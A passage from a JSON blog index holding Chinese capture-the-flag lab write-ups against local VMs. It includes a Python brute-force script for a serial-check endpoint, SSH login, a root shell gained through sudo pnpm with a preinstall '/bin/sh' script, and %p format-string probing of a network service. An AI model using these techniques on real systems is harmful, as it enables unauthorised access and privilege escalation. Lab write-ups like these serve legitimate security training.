const responseText = document.getElementById('response-text');\n    const statusIcon = document.getElementById('status-icon');\n    function cleanInput(value) {\n        return value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();\n    }\n    function formatSerialNumber(value) {\n        let cleanValue = cleanInput(value);\n        let formatted = '';\n        for (let i = 0; i < cleanValue.length; i++) {\n            if (i > 0 && i % 5 === 0) {\n                formatted += '-';\n            }\n            formatted += cleanValue[i];\n        }\n        return formatted;\n    }\n    snInput.addEventListener('input', function () {\n        const startPos = snInput.selectionStart;\n        const formattedValue = formatSerialNumber(snInput.value);\n        snInput.value = formattedValue;\n        let newPos = startPos;\n        if (startPos === 6 || startPos === 12 || startPos === 18 || startPos === 24) {\n            newPos = startPos + 1;\n        }\n        snInput.setSelectionRange(newPos, newPos);\n    });\n    snInput.addEventListener('keypress', function (e) {\n        if (e.key === 'Enter') {\n            verifySerialNumber();\n        }\n    });\n\n    verifyBtn.addEventListener('click', verifySerialNumber);\n    function verifySerialNumber() {\n        const serialNumber = cleanInput(snInput.value);\n        statusIcon.className = 'status-icon pending';\n        statusIcon.innerHTML = '<i class='fas fa-circle-notch fa-spin'></i>';\n        responseText.textContent = '\u9a8c\u8bc1\u4e2d\uff0c\u8bf7\u7a0d\u5019...';\n        if (serialNumber.length !== 25) {\n            statusIcon.className = 'status-icon error';\n            statusIcon.innerHTML = '<i class='fas fa-exclamation-triangle'></i>';\n            responseText.textContent = '\u9519\u8bef: \u5e8f\u5217\u53f7\u957f\u5ea6\u4e0d\u6b63\u786e (\u9700\u898125\u4e2a\u5b57\u7b26)';\n            return;\n        }\n        let hashSN = CreatehashSN(snInput.value);\n        // console.log('hashSN:', hashSN);\n\n        setTimeout(function () {\n            fetch('/checkSN', {\n                method: 'POST',\n                headers: {\n                    'Content-Type': 'application/json'\n                },\n                body: JSON.stringify({ sn: hashSN })\n            })\n                .then(response => response.json())\n                .then(data => {\n                    console.log('checkSN response:', data);\n                    if (data.code === 200) {\n                        statusIcon.className = 'status-icon success';\n                        statusIcon.innerHTML = '<i class='fas fa-check-circle'></i>';\n                        responseText.innerHTML = `\u5e8f\u5217\u53f7 <strong>${snInput.value}</strong> <br>\u9a8c\u8bc1\u6210\u529f\uff01<br> ${data.data}`;\n                    }\n                    else {\n                        statusIcon.className = 'status-icon error';\n                        statusIcon.innerHTML = '<i class='fas fa-times-circle'></i>';\n                        responseText.innerHTML = `\u5e8f\u5217\u53f7 <strong>${snInput.value}</strong> \u9a8c\u8bc1\u5931\u8d25\uff01<br>\u72b6\u6001: \u65e0\u6548\u6216\u5df2\u88ab\u4f7f\u7528`;\n                    }\n                });\n        }, 300);\n    }\n});\n\n// \u968f\u673a\u6570\u751f\u6210\u51fd\u6570\uff08\u4f7f\u7528Math.seedrandom\uff09\nfunction R(seed, min = 100, max = 200) {\n    // const rng = new Math.seedrandom(seed);\n    // // return Math.floor(rng() * (max - min + 1)) + min;\n    // return Math.floor((max - min + 1)) + min;\n    return seed + min + max;\n}\nfunction CreatehashSN(SN) {\n    // if(SN.length!== 29)\n    // {\n    //     return '\u5e8f\u5217\u53f7\u957f\u5ea6\u4e0d\u6b63\u786e (\u9700\u898125\u4e2a\u5b57\u7b26)';\n    // }\n    console.log('SN', SN);\n    const VI = 'Jkdsfojweflk0024564555*';\n    const KEY = '6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC';\n\n    let a = [];\n    let b = [];\n    let e = [];\n    let f = [];\n    let z = [];\n\n    // \u5904\u7406SN\u5b57\u7b26\u4e32\n    for (let i = 0; i < SN.length; i++) {\n        const charCode = SN.charCodeAt(i);\n\n        if (i >= 0 && i <= 4) {\n            a.push(R(charCode));\n            b.push(R(charCode));\n            e.push(R(charCode));\n            f.push(R(charCode));\n            z.push(R(charCode));\n        }\n        if (i >= 5 && i <= 9) {\n            b.push(R(charCode));\n            e.push(R(charCode));\n            f.push(R(charCode));\n            z.push(R(charCode));\n        }\n        if (i >= 10 && i <= 14) {\n            e.push(R(charCode));\n            f.push(R(charCode));\n            z.push(R(charCode));\n        }\n        if (i >= 15 && i <= 19) {\n            f.push(R(charCode));\n            z.push(R(charCode));\n        }\n        if (i >= 20 && i <= 24) {\n            z.push(R(charCode));\n        }\n    }\n    // console.log('a', a);\n    // console.log('b', b);\n    // console.log('e', e);\n    // console.log('f', f);\n    // console.log('z', z);\n    // e = Math.max(f, g);\n    if (a[0] > a[2] || a[1] > a[3]) {\n        a[0] = Math.max(a[0], a[1], a[2], a[3], a[4]);\n    } else {\n        a[0] = Math.min(a[0], a[1], a[2], a[3], a[4]);\n    }\n    if (b[4] > b[6]) {\n        b[0] = Math.max(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);\n    } else {\n        b[0] = Math.min(b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);\n    }\n    if (e[8] > e[10] || e[9] > e[11]) {\n        e[0] = Math.max(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11]);\n    } else {\n        e[0] = Math.min(e[0], e[1], e[2], e[3], e[4], e[5], e[6], e[7], e[8], e[9], e[10], e[11]);\n    }\n    if (f[0] > f[10]) {\n        f[0] = Math.max(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19]);\n    } else {\n        f[0] = Math.min(f[0], f[1], f[2], f[3], f[4], f[5], f[6], f[7], f[8], f[9], f[10], f[11], f[12], f[13], f[14], f[15], f[16], f[17], f[18], f[19]);\n    }\n    if (z[15] > z[17] || z[18] > z[24]) {\n        z[0] = Math.max(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24]);\n    } else {\n        z[0] = Math.min(z[0], z[1], z[2], z[3], z[4], z[5], z[6], z[7], z[8], z[9], z[10], z[11], z[12], z[13], z[14], z[15], z[16], z[17], z[18], z[19], z[20], z[21], z[22], z[23], z[24]);\n    }\n    // console.log('a[0]', a[0]);\n    // console.log('b[0]', b[0]);\n    // console.log('e[0]', e[0]);\n    // console.log('f[0]', f[0]);\n    // console.log('z[0]', z[0]);\n    let sum = 0;\n    for (let i = 0; i < a.length; i++) {\n        sum += a[i]\n    }\n    // console.log('sum', sum);\n    a[0] = (sum ^ a[0]) % 12;\n    a[0] = KEY.charAt(a[0]);\n\n    for (let i = 0; i < b.length; i++) {\n        sum += b[i]\n    }\n    // console.log('sum', sum);\n    b[0] = (sum ^ b[0]) % 9;\n    b[0] = KEY.charAt(b[0]);\n\n    for (let i = 0; i < e.length; i++) {\n        sum += e[i]\n    }\n    // console.log('sum', sum);\n\n    e[0] = (sum ^ e[0]) % 8;\n    e[0] = KEY.charAt(e[0]);\n\n\n    for (let i = 0; i < f.length; i++) {\n        sum += f[i]\n    }\n    // console.log('sum', sum);\n    f[0] = (sum ^ f[0]) % 7;\n    f[0] = KEY.charAt(f[0]);\n\n    for (let i = 0; i < z.length; i++) {\n        sum += z[i]\n    }\n    // console.log('sum', sum);\n    z[0] = (sum ^ z[0]) % 6;\n    z[0] = VI.charAt(z[0]);\n\n    // console.log('a[0]', a[0]);\n    // console.log('b[0]', b[0]);\n    // console.log('e[0]', e[0]);\n    // console.log('f[0]', f[0]);\n    // console.log('z[0]', z[0]);\n    let hashSN = md5(a[0] + b[0] + e[0] + f[0] + z[0]);\n    // console.log('hashSN', hashSN);\n    return hashSN;\n}\n                                                               \n```\n\n\u4ed6\u8fd9hashSN\u6709\u95ee\u9898\uff0c\u662f\u56fa\u5b9a\u7684\u91cf\uff0c\u7206\u7834\u4e00\u4e0b\u5c31\u597d\u4e86\n\n\u53bb\u7f51\u9875\u6293\u4e2a\u5305\n\n![image-20250608115935547](https://7r1umphk.github.io/image/20250608115936018.webp)\n\n\u968f\u4fbf\u8f93\u70b9\uff0c\u6293\u5305\n\n```\nPOST /checkSN HTTP/1.1\nHost: 192.168.205.131:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nReferer: http://192.168.205.131:8080/\nContent-Type: application/json\nContent-Length: 41\nOrigin: http://192.168.205.131:8080\nConnection: keep-alive\nPriority: u=4\n\n{'sn':'4818799e57fe67c963b90a99f797beae'}\n```\n\n\u7136\u540e\u4e22\u7ed9AI\u5427\uff0c\u4e0d\u60f3\u81ea\u5df1\u5199\n\n\u7136\u540eAI\u7ed9\u7684\u6709\u70b9\u5c0f\u95ee\u9898\uff0c\u4e0d\u663e\u793a\u6bcf\u6b21\u7206\u7834\u5c31\u7b97\u4e86\uff0c\u597d\u50cf\u5b83\u7206\u7834\u6210\u529f\u4e86\u4e5f\u4f1a\u7ee7\u7eed\u7206\u7834\uff0c\u81ea\u5df1\u6539\u4e00\u4e0b\u5427\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/2026bak]                                                                                                                                             \n\u2514\u2500$ vim bp.py                                                                                                                                                               \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/2026bak]\n\u2514\u2500$ cat bp.py             \nimport hashlib\nimport json\nimport queue\nimport threading\nimport requests\n\nKEY = '6K+35LiN6KaB5bCd6K+V5pq05Yqb56C06Kej77yM5LuU57uG55yL55yL5Yqg5a+G5rqQ5Luj56CB44CC'\nVI = 'Jkdsfojweflk0024564555*'\n\ndef generate_all_hashes():\n    hashes = []\n    for i1 in range(12):\n        s1 = KEY[i1]\n        for i2 in range(9):\n            s2 = KEY[i2]\n            for i3 in range(8):\n                s3 = KEY[i3]\n                for i4 in range(7):\n                    s4 = KEY[i4]\n                    for i5 in range(6):\n                        s5 = VI[i5]\n                        s = s1 + s2 + s3 + s4 + s5\n                        md5_hex = hashlib.md5(s.encode()).hexdigest()\n                        hashes.append(md5_hex)\n    return hashes\n\ndef worker(q, result, url):\n    headers = {'Content-Type': 'application/json'}\n    while not result and not q.empty():\n        try:\n            hash_sn = q.get_nowait()\n            data = json.dumps({'sn': hash_sn})\n            response = requests.post(url, headers=headers, data=data, timeout=5)\n            if response.status_code == 200:\n                try:\n                    resp_data = response.json()\n                    if resp_data.get('code') == 200:\n                        result.append(hash_sn)\n                        print(f'[+] Success! Found Valid SN: {hash_sn}')\n                        return\n                    else:\n                        print(f'[-] Failed: {hash_sn} -> {resp_data.get('msg', 'Unknown error')}')\n                except json.JSONDecodeError:\n                    print(f'[-] Failed (Invalid JSON): {hash_sn}')\n            else:\n                print(f'[-] Failed (HTTP {response.status_code}): {hash_sn}')\n        except Exception as e:\n            print(f'[!] Error with {hash_sn}: {str(e)}')\n        finally:\n            q.task_done()\n\nif __name__ == '__main__':\n    SERVER_URL = 'http://192.168.205.131:8080/checkSN'\n    all_hashes = generate_all_hashes()\n    print(f'Generated {len(all_hashes)} hashes. Starting\u7206\u7834...')\n\n    task_queue = queue.Queue()\n    for h in all_hashes:\n        task_queue.put(h)\n\n    valid_hash = []\n    num_threads = 8\n    threads = []\n\n    for _ in range(num_threads):\n        t = threading.Thread(target=worker, args=(task_queue, valid_hash, SERVER_URL))\n        t.daemon = True\n        t.start()\n        threads.append(t)\n\n    task_queue.join()\n\n    if valid_hash:\n        print(f'[+] Valid hashSN found: {valid_hash[0]}')\n    else:\n        print('[-] No valid hashSN found.')\n                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/2026bak]\n\u2514\u2500$ python3 $_\nGenerated 36288 hashes. Starting\u7206\u7834...\n[-] Failed: 7e761b3333f90f1adb4b2bdb0192256f -> Error: Invalid SN\n\u7701\u7565\n[+] Success! Found Valid SN: ee5a82db0f9bf1c1903821477e11c067\n```\n\nSN: ee5a82db0f9bf1c1903821477e11c067\uff0c\u6211\u4eec\u8bd5\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/2026bak]\n\u2514\u2500$ curl -X POST -H 'Content-Type: application/json' -d '{'sn': 'ee5a82db0f9bf1c1903821477e11c067'}' http://192.168.205.131:8080/checkSN\n{'code':200,'data':'welcome:DPKU9-8APJ9-8XZJ0-8XZ08-7H111','msg':'Success: Valid SN '}                                                                                      \n```\n\n\u767b\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/2026bak]\n\u2514\u2500$ ssh welcome@192.168.205.131\nThe authenticity of host '192.168.205.131 (192.168.205.131)' can't be established.\nED25519 key fingerprint is SHA256:xJ90oWmr5sPR2afHz9etzSdtxINmLI+JvbwgV/iCsWY.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:16: [hashed name]\n    ~/.ssh/known_hosts:17: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.131' (ED25519) to the list of known hosts.\nwelcome@192.168.205.131's password: \n=============================\nWelcome!!!\nQQ Group:660930334\n=============================\nlingdong:~$ id\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n```\n\n\u627e\u4fe1\u606f\n\n```\nlingdong:~$ sudo -l\nMatching Defaults entries for welcome on lingdong:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults for welcome:\n    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'\n\nUser welcome may run the following commands on lingdong:\n    (ALL : ALL) NOPASSWD: /root/.local/share/pnpm/global-bin/pm2\n    (ALL : ALL) NOPASSWD: /usr/bin/pnpm\n```\n\n\u770b\u6709\u6ca1\u6709\u73b0\u6210\u7684\n\n\u6ca1\u627e\u5230\uff0c\u770b\u770b\u5e2e\u52a9\u6587\u6863\n\n```\nlingdong:~$ sudo /usr/bin/pnpm --help\nVersion 10.11.1 (compiled to binary; bundled Node.js v20.11.1)\nUsage: pnpm [command] [flags]\n       pnpm [ -h | --help | -v | --version ]\n\nManage your dependencies:\n      add                  Installs a package and any packages that it depends on. By default, any new package is installed as a prod dependency\n      import               Generates a pnpm-lock.yaml from an npm package-lock.json (or npm-shrinkwrap.json) file\n   i, install              Install all dependencies for a project\n  it, install-test         Runs a pnpm install followed immediately by a pnpm test\n  ln, link                 Connect the local project to another one\n      prune                Removes extraneous packages\n  rb, rebuild              Rebuild a package\n  rm, remove               Removes packages from node_modules and from the project's package.json\n      unlink               Unlinks a package. Like yarn unlink but pnpm re-installs the dependency after removing the external link\n  up, update               Updates packages to their latest version based on the specified range\n\nReview your dependencies:\n      audit                Checks for known security issues with the installed packages\n      licenses             Check licenses in consumed packages\n  ls, list                 Print all the versions of packages that are installed, as well as their dependencies, in a tree-structure\n      outdated             Check for outdated packages\n\nRun your scripts:\n      exec                 Executes a shell command in scope of a project\n      run                  Runs a defined package script\n      start                Runs an arbitrary command specified in the package's 'start' property of its 'scripts' object\n   t, test                 Runs a package's 'test' script, if one was provided\n\nOther:\n      cat-file             Prints the contents of a file based on the hash value stored in the index file\n      cat-index            Prints the index file of a specific package from the store\n      find-hash            Experimental! Lists the packages that include the file with the specified hash.\n      pack                 Create a tarball from a package\n      publish              Publishes a package to the registry\n      root                 Prints the effective modules directory\n\nManage your store:\n      store add            Adds new packages to the pnpm store directly. Does not modify any projects or files outside the store\n      store path           Prints the path to the active store directory\n      store prune          Removes unreferenced (extraneous, orphan) packages from the store\n      store status         Checks for modified packages in the store\n\nOptions:\n  -r, --recursive          Run the command for each project in the workspace.\n```\n\n\n\n\u770b\u7740\u6709\u70b9\u50cfnpm\u554a\uff0c\u8fd9\u73a9\u610f\u548cnpm\u5dee\u4e0d\u591a\u5427\uff1f\u8bd5\u8bd5\n\n![image-20250608122239857](https://7r1umphk.github.io/image/20250608122240292.webp)\n\n```\nlingdong:~$ TF=$(mktemp -d)\nlingdong:~$ echo '{'scripts': {'preinstall': '/bin/sh'}}' > $TF/package.json\nlingdong:~$ sudo pnpm -C $TF --unsafe-perm i\nAlready up to date\n\n> @ preinstall /tmp/tmp.ggFJFL\n> /bin/sh\n\n/tmp/tmp.ggFJFL # id\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n```\n\n\u53ef\u4ee5\uff0c\u62ff\u4e00\u4e0bflag\n\n```\n/tmp/tmp.ggFJFL # cat /root/root.txt \nflag{root-b89ed76b27e91ad5d773ddadae256072}\n/tmp/tmp.ggFJFL # cat /home/welcome/user.txt \nflag{user-afc8b494c5ba167971f10274f5a81534}\n```sentence", "top": 0, "createdAt": 1751016570, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P33": {"htmlDir": "docs/post/nei-bu-_easyfmt.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_easyfmt", "postUrl": "post/nei-bu-_easyfmt.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/33", "commentNum": 0, "wordCount": 18152, "description": "![image-20250620183907687](https://7r1umphk.github.io/image/20250620183915120.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo arp-scan -l           \n[sudo] password for kali: \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.\n192.168.205.139 08:00:27:7c:4c:12       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fd:86:ce       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.063 seconds (124.09 hosts/sec). 4 responded\n                                   \n```\n\n139\u7684ip\uff0c\u8fdb\u884c\u670d\u52a1\u63a2\u6d4b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p- 192.168.205.139                 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 06:40 EDT\nNmap scan report for 192.168.205.139\nHost is up (0.00016s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n1337/tcp open  waste\nMAC Address: 08:00:27:7C:4C:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.21 seconds\n \n```\n\n\u6709\u4e2a1337\u7aef\u53e3\uff0cnc\u4e0a\u53bb\u7784\u4e00\u773c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nc 192.168.205.139 1337 \nwelcome:Where is my password?\nroot:Well,it's in the stack,just find it.\n```\n\n\u7ffb\u8bd1\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ echo 'welcome:Where is my password?                  \nroot:Well,it's in the stack,just find it.' | trans -b :zh 2>/dev/null\n\u6b22\u8fce\uff1a\u6211\u7684\u5bc6\u7801\u5728\u54ea\u91cc\uff1f\nroot\uff1a\u55ef\uff0c\u5b83\u5728\u5806\u6808\u4e2d\uff0c\u53ea\u662f\u627e\u5230\u5b83\u3002\n           \n```\n\n\u63d0\u793a \u5806\u6808\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nc 192.168.205.139 1337 \nwelcome:Where is my password?\nroot:Well,it's in the stack,just find it.\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n```\n\n\u4e22\u4e86\u4ebf\u70b9A\u8fc7\u53bb\uff0c\u56de\u663e\u6ca1\u4ef7\u503c\uff0c**\u6808\u6ea2\u51fa**\u6682\u65f6\u65e0\u679c\n\n\u7136\u540e\u5c31\u8bd5\u4e86\u4e00\u4e0b**\u683c\u5f0f\u5316\u5b57\u7b26\u4e32**\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nc 192.168.205.139 1337\nwelcome:Where is my password?\nroot:Well,it's in the stack,just find it.\n%p.%p.%p.%p.%p.%p\n0x1afc2a1.(nil).0x1afc2b2.0x7ffd9c94ced0.0x7ff5d0eb2be0.0x70252e70252e7025\n\n```\n\n\u627e\u5230\u4e86\uff0c\u62ff\u811a\u672c\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ for i in $(seq 1 40); do echo -n '$i\\n'\npa=$(python3 -c 'print('.'.join(['%p'] * $i))')\necho '$pa' | nc -w 1 192.168.205.139 1337 | tail -n 1\ndone\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n0xf472a1.(nil).(nil).0x7ffd4ea8b960.0x7f08e27a0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f08e25f5d7a.0x7ffd4ea8bab8.0x14ea8bc89.\n23\n0x21f62a1.(nil).(nil).0x7fff4c072100.0x7f0958737be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f095858cd7a.0x7fff4c072258.0x14c072429.\n24\n0x135f2a1.(nil).(nil).0x7ffce42da9e0.0x7f908d69abe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f908d4efd7a.0x7ffce42dab38.0x1e42dad09.\n25\n0x1b9f2a1.(nil).(nil).0x7ffdc9ef61f0.0x7f8a23246be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f8a2309bd7a.0x7ffdc9ef6348.0x1c9ef6519.\n26\n0x10472a1.(nil).(nil).0x7fff6159ddc0.0x7f4e89dc1be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f4e89c16d7a.0x7fff6159df18.0x16159e0e9.\n27\n0x1de52a1.(nil).(nil).0x7fff75c854d0.0x7ff45c50bbe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7ff45c360d7a.0x7fff75c85628.0x175c857f9.\n28\n0xbe52a1.(nil).(nil).0x7ffe4fd2f9b0.0x7f5fc99e8be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f5fc983dd7a.0x7ffe4fd2fb08.0x14fd2fcd9.\n29\n0x1b822a1.(nil).(nil).0x7fffc7c06ac0.0x7f3e6f018be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f3e6ee6dd7a.0x7fffc7c06c18.0x1c7c06de9.\n30\n0x176f2a1.(nil).(nil).0x7ffd196b6bd0.0x7f79cf143be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f79cef98d7a.0x7ffd196b6d28.0x1196b6ef9.\n31\n0x1b242a1.(nil).(nil).0x7ffe081aeea0.0x7f978cae5be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f978c93ad7a.0x7ffe081aeff8.0x1081af1c9.\n32\n0x1f1c2a1.(nil).(nil).0x7ffe621be420.0x7f9d098d9be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f9d0972ed7a.0x7ffe621be578.0x1621be749.\n33\n0x191c2a1.(nil).(nil).0x7ffc5b7e0190.0x7f5c090fabe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f5c08f4fd7a.0x7ffc5b7e02e8.0x15b7e04b9.\n34\n0x1e482a1.(nil).(nil).0x7ffd2f19fc30.0x7ff602059be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7ff601eaed7a.0x7ffd2f19fd88.0x12f19ff59.\n35\n0x19452a1.(nil).(nil).0x7ffd038568d0.0x7f2a117a8be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f2a115fdd7a.0x7ffd03856a28.0x103856bf9.\n36\n0xd592a1.(nil).(nil).0x7ffde1f69190.0x7f8e3bbc2be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f8e3ba17d7a.0x7ffde1f692e8.0x1e1f694b9.\n37\n0x126a2a1.(nil).(nil).0x7ffe821c3800.0x7f492e554be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f492e3a9d7a.0x7ffe821c3958.0x1821c3b29.\n38\n0x9dc2a1.(nil).(nil).0x7ffd0117d1e0.0x7fb8ec1b4be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7fb8ec009d7a.0x7ffd0117d338.0x10117d509.\n39\n0x10c22a1.(nil).(nil).0x7ffdd856fdc0.0x7fd5d4155be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7fd5d3faad7a.0x7ffdd856ff18.0x1d85700e9.\n40\n0x8e82a1.(nil).(nil).0x7ffd3af08f60.0x7f34bfca0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e